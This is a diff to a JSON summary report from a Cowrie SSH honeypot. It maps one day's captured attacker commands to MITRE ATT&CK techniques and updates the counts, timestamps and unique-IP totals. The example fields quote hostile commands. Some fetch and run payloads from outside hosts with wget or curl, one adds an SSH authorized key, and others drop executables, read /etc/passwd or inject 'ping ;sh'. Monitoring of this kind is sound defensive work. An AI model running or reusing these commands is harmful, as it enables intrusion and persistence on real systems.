@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-11 18:00:44",
+  "generated": "2026-08-11 19:00:44",
   "totals": {
-    "commands": 9545,
-    "login_failed": 4373,
-    "login_success": 2145,
-    "sessions": 4734
+    "commands": 10995,
+    "login_failed": 4815,
+    "login_success": 2515,
+    "sessions": 5183
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4373,
+      "count": 4815,
       "examples": [
         "root / 123456",
         "root / admin",
@@ -21,14 +21,14 @@
         "root / !QAZ2wsx3edc"
       ],
       "first": "2026-08-11T00:00:02.784296Z",
-      "last": "2026-08-11T18:00:40.135912Z",
-      "unique_ips": 122
+      "last": "2026-08-11T19:00:29.933147Z",
+      "unique_ips": 129
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2145,
+      "count": 2515,
       "examples": [
         "uname -a / exit",
         "root / root",
@@ -37,14 +37,14 @@
         "enable / shell"
       ],
       "first": "2026-08-11T00:00:05.505729Z",
-      "last": "2026-08-11T18:00:40.523000Z",
-      "unique_ips": 104
+      "last": "2026-08-11T19:00:30.338931Z",
+      "unique_ips": 110
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 470,
+      "count": 548,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-08-11T17:59:24.125603Z",
-      "unique_ips": 41
+      "last": "2026-08-11T18:49:25.350122Z",
+      "unique_ips": 45
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 276,
+      "count": 324,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -69,36 +69,36 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-08-11T17:59:24.125603Z",
-      "unique_ips": 42
+      "last": "2026-08-11T18:54:58.687372Z",
+      "unique_ips": 47
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 63,
+      "count": 94,
       "examples": [
         "/bin/busybox ps; /bin/busybox ECCHI",
         "ps | grep '[Mm]iner'",
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-08-11T00:40:36.300925Z",
-      "last": "2026-08-11T17:58:39.869138Z",
+      "last": "2026-08-11T18:48:51.733831Z",
       "unique_ips": 3
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 32,
+      "count": 36,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-08-11T00:53:13.060148Z",
-      "last": "2026-08-11T17:58:40.986723Z",
-      "unique_ips": 31
+      "last": "2026-08-11T18:54:58.392921Z",
+      "unique_ips": 35
     },
     {
       "id": "T1082",
@@ -147,12 +147,12 @@
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 8,
+      "count": 9,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-08-11T01:37:12.477623Z",
-      "last": "2026-08-11T17:00:04.778932Z",
+      "last": "2026-08-11T18:40:43.821319Z",
       "unique_ips": 2
     },
     {
@@ -205,6 +205,18 @@
       "unique_ips": 2
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-08-11T12:36:55.620095Z",
+      "last": "2026-08-11T18:54:58.397656Z",
+      "unique_ips": 3
+    },
+    {
       "id": "T1016",
       "name": "System Network Configuration Discovery",
       "tactic": "Discovery",
@@ -215,84 +227,72 @@
       "first": "2026-08-11T11:23:51.267475Z",
       "last": "2026-08-11T11:34:07.620742Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-08-11T12:36:55.620095Z",
-      "last": "2026-08-11T13:33:22.647258Z",
-      "unique_ips": 2
     }
   ],
   "unmapped": [
     [
       "sh",
-      2052
+      2419
     ],
     [
       "system",
-      1993
+      2329
     ],
     [
       "shell",
-      1993
+      2329
     ],
     [
       "/bin/busybox",
-      1067
+      1088
     ],
     [
       "/bin/busybox ECCHI",
-      177
+      270
     ],
     [
       "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI",
-      59
+      90
     ],
     [
       "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon",
-      59
+      90
     ],
     [
       "rm /dev/.t; rm /dev/.sh; rm /dev/.human",
-      59
+      90
     ],
     [
       "cd /dev/",
-      59
+      90
     ],
     [
       "/bin/busybox cat /bin/echo",
-      59
+      90
     ],
     [
       "enable",
-      43
+      48
     ],
     [
       "ping ;sh",
-      38
+      41
     ],
     [
       "linuxshell",
-      37
+      40
     ],
     [
       "cd /proc && cat self/cmdline",
-      30
+      33
     ],
     [
       "enablelinuxshell",
-      29
+      32
     ],
     [
       "busybox",
-      29
+      32
     ],
     [
       ">> .d",
